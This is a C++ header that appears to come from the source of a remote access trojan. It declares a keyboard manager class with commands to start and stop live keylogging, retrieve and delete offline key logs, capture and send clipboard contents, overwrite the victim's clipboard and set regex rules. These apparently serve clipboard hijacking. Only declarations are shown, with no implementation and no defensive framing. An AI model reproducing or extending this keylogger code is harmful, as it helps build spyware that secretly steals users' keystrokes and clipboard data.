#pragma once
#include "Manager.h"

#include <Shlobj.h>
#include "Input.h"
enum
{
	COMMAND_KEYBOARD_GETOFFLINE,
	COMMAND_KEYBOARD_DEL,
	COMMAND_KEYBOARD_OLKEYLOG_START,
	COMMAND_KEYBOARD_SET_CLIPBOARD_DIF,
	COMMAND_KEYBOARD_OLKEYLOG_CLOSE,
	COMMAND_KEYBOARD_REGEX_SETRULE,
	COMMAND_KEYBOARD_REGEX_DELRULE,

	TOKEN_KEYBOARD_OFFLINEDATA,
	TOKEN_KEYBOARD_OFFLINEDATA_ERROR,
	TOKEN_KEYBOARD_ONLINEDATA,
	TOKEN_KEYBOARD_CLIPBOARD,

};

struct sRegrxs
{
	std::string reg;
	std::string data;
};

class CKeyboardManager : public CManager
{
public:
	BOOL m_buser;
	CKeyboardManager(ISocketBase* pClient);
	virtual ~CKeyboardManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	BOOL IsWindowsFocusChange();
	BOOL IsClipboardChange();
	void SendOnlineDate(TCHAR* p_Buffer);
	void UpdateLocalClipboard(char* buf, int len);
	void SendErroe(TCHAR* data);
	TCHAR szPath[MAX_PATH];
	bool m_bIsWorking;
	HANDLE  m_hMutex;

	HANDLE m_hKeyLoggerThread;
	HANDLE m_ClipboardLoggerThread;

	CInterCriSec	m_cs;
	DWORD m_dwLastCapture;
	BOOL bregex;
	CInterCriSec m_CriSec;
};




